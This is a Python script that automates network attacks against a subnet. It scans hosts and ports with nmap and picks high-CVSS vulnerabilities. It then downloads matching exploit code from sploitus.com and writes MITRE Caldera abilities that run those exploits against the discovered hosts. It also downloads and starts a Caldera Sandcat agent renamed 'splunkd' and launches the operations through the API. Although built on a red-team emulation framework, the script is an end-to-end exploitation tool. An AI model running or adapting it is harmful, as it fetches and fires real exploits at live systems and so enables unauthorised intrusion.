import sys
import subprocess
import ipaddress
import re
import json
import requests
from bs4 import BeautifulSoup
import uuid
import os
import time


def find_own_ip(subnet):
    """Find own IP within the given subnet."""
    own_ips = []
    ip_process = subprocess.Popen(["ifconfig", "-a"], stdout=subprocess.PIPE)
    ip_output = ip_process.communicate()[0].decode("utf-8")
    ip_pattern = r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
    matches = re.findall(ip_pattern, ip_output)
    network = ipaddress.ip_network(subnet)
    for ip in matches:
        if ipaddress.ip_address(ip) in network:
            own_ips.append(ip)
    return own_ips

def scan_subnet(subnet):
    """Run Nmap ping scan on the specified subnet."""
    command = ['nmap', '-sP', subnet]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, _ = process.communicate()
    return output.decode('utf-8')

def parse_ips(nmap_output):
    """Parse Nmap output and collect IPs."""
    ip_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
    ips = re.findall(ip_pattern, nmap_output)
    return ips

def scan_ports(ip):
    """Scan open ports for the given IP."""
    command = ['nmap', '-p-', '-sT', ip]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, _ = process.communicate()
    return output.decode('utf-8')

def parse_open_ports(nmap_output, ip):
    """Parse Nmap output and collect open ports."""
    port_pattern = r'(\d+)/tcp\s+open'
    matches = re.findall(port_pattern, nmap_output)
    return [(ip, port) for port in matches]

def scan_vulnerabilities(ip, port):
    """Scan vulnerabilities for the given IP and port."""
    command = ['nmap', ip, '-p' + port, '-sV', '--script', 'nmap-vulners/', '-oN', 'out1.txt']
    subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def parse_vulnerabilities(filename, ip, port):
    """Parse vulnerabilities from the output file."""
    
    with open(filename, 'r') as f:
        for line in f:
            if '*EXPLOIT*' in line:
                #print(line)
                parts = line.split('\t')
                #print(parts)
                cvss = float(parts[2])
                #print(cvss)
                if cvss > 7:
                    ip = ip
                    port = port
                    vulnum = parts[1]
                    url = parts[3]
                    vulnerabilities.append({"ip": ip, "port": port, "vulnum": vulnum, "URL": url})
    return vulnerabilities

def get_exploit_code(url):
    # Send HTTP GET request to the provided URL
    response = requests.get(url)
    if response.status_code == 200:
        # Parse the HTML content using BeautifulSoup
        soup = BeautifulSoup(response.content, 'html.parser')
        # Find the <pre> tag with class 'centered code'
        exploit_pre = soup.find('pre', class_='centered code')
        if exploit_pre:
            # Get the data-lang attribute to determine the language
            language = exploit_pre.get('data-lang')
            # Find the <code> tag inside <pre>
            exploit_code = exploit_pre.find('code', class_='code-block')
            if exploit_code:
                return exploit_code.text.strip(), language.lower()  # Convert language to lowercase
            else:
                print("Exploit code not found in the response.")
                return None, None
        else:
            print("Exploit code not found in the response.")
            return None, None
    else:
        print(f"Failed to fetch URL. Status code: {response.status_code}")
        return None, None

def save_exploit_code(exploit_code, language, filename):
    directory = "data/payloads"
    if not os.path.exists(directory):
        os.makedirs(directory)
    
    # Determine file extension based on the language
    if language == "ruby":
        extension = "rb"
    elif language == "bash":
        extension = "sh"
    elif language == "python":
        extension = "py"
    else:
        extension = language  # Use the language as extension for other script languages
    
    filepath = os.path.join(directory, f"{filename}.{extension}")
    with open(filepath, 'w') as file:
        file.write(exploit_code)
    print(f"Exploit code saved to '{filepath}'")
    return os.path.basename(filepath)

# Function to generate unique UUID
def generate_uuid():
    return str(uuid.uuid4())

# Function to create ability file
def create_ability_file(ability_uuid, vuln_data):

    # if the demo_folder directory is not present 
    if not os.path.exists("data/abilities/initial-access"): 
        os.makedirs("data/abilities/initial-access") 

    filename = f"data/abilities/initial-access/{ability_uuid}.yml"
    with open(filename, 'w') as f:

        f.write(f"- name: {vuln_data['vulnum']}\n")
        f.write(f"  description: read + {vuln_data['URL']}\n")
        f.write("  tactic: initial-access\n")
        f.write("  technique_id: T1190\n")
        f.write(f"  technique_name: {vuln_data['vulnum']}\n")
        f.write("  executors:\n")
        f.write("  - cleanup: []\n")
        f.write("    timeout: 1000\n")
        f.write("    platform: linux\n")
        f.write("    name: sh\n")
        f.write("    command: '\n")
        f.write(f"      chmod +x {vuln_data['exploit']};\n")
        f.write(f"      ./{vuln_data['exploit']} {vuln_data['ip']}:{vuln_data['port']}'\n")
        f.write("    payloads:\n")
        f.write(f"    - {vuln_data['exploit']}\n")
        f.write(f"  id: {ability_uuid}\n")

# Function to create adversary file
def create_adversary_file(adversary_uuid, ability_uuid, vuln_data):
    filename = f"data/adversaries/{adversary_uuid}.yml"
    with open(filename, 'w') as f:
        f.write(f'name: Attack on {vuln_data["vulnum"]}\n')
        f.write(f'description: Attack on {vuln_data["vulnum"]} and run sandcat\n')
        f.write('atomic_ordering: \n')
        f.write(f'  - {ability_uuid}\n')
        f.write('  - 2f34977d-9558-4c12-abad-349716777c6b #(установка и запуск агента Калдеры Sandcat)\n')
        f.write(f'adversary_id: {adversary_uuid}\n')

def main():
    if len(sys.argv) != 2:
        print("Usage: python script.py <subnet>")
        sys.exit(1)

    # Get subnet from command line argument
    subnet = sys.argv[1]

    # Run Nmap scan
    nmap_output = scan_subnet(subnet)

    # Parse Nmap output and collect IPs
    ips = parse_ips(nmap_output)

    # Find own IPs within the subnet
    own_ips = find_own_ip(subnet)
    if own_ips:
        print("Own IPs found:", own_ips)

        # Remove own IPs from collection
        ips = [ip for ip in ips if ip not in own_ips]
    else:
        print("Couldn't find own IP in the subnet.")

    # Print collected IPs
    print("Collected IPs excluding own IPs:")
    for ip in ips:
        print(ip)

    # Findings array to store IP-port tuples
    findings = []

    # Find open ports for each IP
    for ip in ips:
        nmap_output = scan_ports(ip)
        open_ports = parse_open_ports(nmap_output, ip)
        findings.extend(open_ports)

    # Print findings
    print("Findings:")
    for finding in findings:
        print(finding)

    global vulnerabilities
    vulnerabilities = []
    
    # Scan vulnerabilities for each finding
    for ip, port in findings:
        scan_vulnerabilities(ip, port)
        # Parse vulnerabilities
        parse_vulnerabilities('out1.txt', ip, port)
    
    if os.path.isfile('out1.txt'):
        os.remove('out1.txt') 

#    # Print vulnerabilities
#    print("Vulnerabilities:")
#    for vuln in vulnerabilities:
#        print(vuln)

    # Save vulnerabilities to a file
    with open("vulns.json", "w") as f:
        json.dump(vulnerabilities, f, indent=4)
        
    # Load JSON records from file
    with open('vulns.json', 'r') as file:
        records = json.load(file)

    # Iterate over each record
    for record in records:
        ip = record['ip']
        port = record['port']
        vulnum = record['vulnum']
        url = record['URL']

        print(f"Processing record: {vulnum}")
    
        # Send request to the provided URL
        exploit_code, language = get_exploit_code(f"https://sploitus.com/exploit?id={vulnum}")
        if exploit_code and language:
            filename = vulnum
            exploit_filepath = save_exploit_code(exploit_code, language, filename)
            # Update record with exploit filepath
            record['exploit'] = exploit_filepath
        else:
            print("Skipping record due to missing exploit code or language.")

    # Save updated records back to vulns.json
    with open('vulns.json', 'w') as file:
        json.dump(records, file, indent=4)

    print("All records processed and updated in vulns.json.")
    
    # Read data from vulns.json
    with open('vulns.json') as f:
        vulns_data = json.load(f)
    
    # Process each record in vulns.json
    for vuln_data in vulns_data:
        # Check if ability exists, if not generate UUID
        if "ability" not in vuln_data:
            ability_uuid = generate_uuid()
            vuln_data["ability"] = ability_uuid
            create_ability_file(ability_uuid, vuln_data)
        else:
            ability_uuid = vuln_data["ability"]
    
        # Check if adversary exists, if not generate UUID
        if "adversary" not in vuln_data:
            adversary_uuid = generate_uuid()
            vuln_data["adversary"] = adversary_uuid
            create_adversary_file(adversary_uuid, ability_uuid, vuln_data)
        else:
            adversary_uuid = vuln_data["adversary"]

    # Write the updated data back to vulns.json
    with open('vulns.json', 'w') as f:
        json.dump(vulns_data, f)

    # Get API_KEY from local.yaml
    with open('conf/local.yml') as f:
        for line in f:
            if 'api_key_red' in line:
                api_key = line.strip().split(':')[1].strip()

    # Run server.py in the background
    os.system('python server.py &')
    time.sleep(90)
    
    # Run Caldera Sandcat agent localy
    os.system('server="http://0.0.0.0:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group red -v &')
    time.sleep(30)    
    

    # Send requests for each record in vulns.json
    for vuln_data in vulns_data:
        ip = vuln_data["ip"]
        port = vuln_data["port"]
        vulnum = vuln_data["vulnum"]
        adversary = vuln_data["adversary"]
    
        os.system(f'curl -X PUT -H "KEY:{api_key}" http://localhost:8888/api/rest -d \'{{"index":"operations","name":"{ip}:{port}+{vulnum}","adversary_id":"{adversary}"}}\'')
        os.system(f'curl -X POST -H "KEY:{api_key}" http://localhost:8888/api/rest -d \'{{"index":"operation", "op_id":"{ip}:{port}+{vulnum}", "state":"start"}}\'')
    
        # Wait for 10 seconds
        time.sleep(10)    
    

if __name__ == "__main__":
    main()
